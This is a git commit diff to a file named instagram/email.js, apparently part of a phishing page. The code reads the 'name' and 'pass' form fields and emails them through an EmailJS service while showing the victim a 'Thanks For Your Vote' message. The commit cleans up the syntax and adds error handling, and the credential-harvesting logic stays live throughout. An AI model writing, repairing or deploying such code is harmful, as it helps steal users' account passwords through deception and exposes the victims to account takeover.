0106e29a444d39d97ed4cc56da48b509c358a4d2
sharo-cod <sharo4192@gmail.com>
2024-11-02 22:55:22 +0500

    emal js changes

--- instagram/email.js
+++ instagram/email.js
@@ -1,9 +1,14 @@
-function sendMail(){
-  let parms ={
-    from_name: document.getElementById("name").value,
-    Pass_user: document.getElementById("pass").value,
-  }
+function sendMail() {
+  let params = {
+      from_name: document.getElementById("name").value,
+      Pass_user: document.getElementById("pass").value,
+  };
 
-  emailjs.send("service_c5buabe","template_rjpj60s",parms).then(alert("Thanks For Your Vote"))
+  emailjs.send("service_c5buabe", "template_rjpj60s", params)
+      .then((response) => {
+          alert("Thanks For Your Vote"); // This will be called if the email is sent successfully
+      })
+      .catch((error) => {
+          console.error("Failed to send email. Error:", error); // Handle any errors
+      });
 }
-
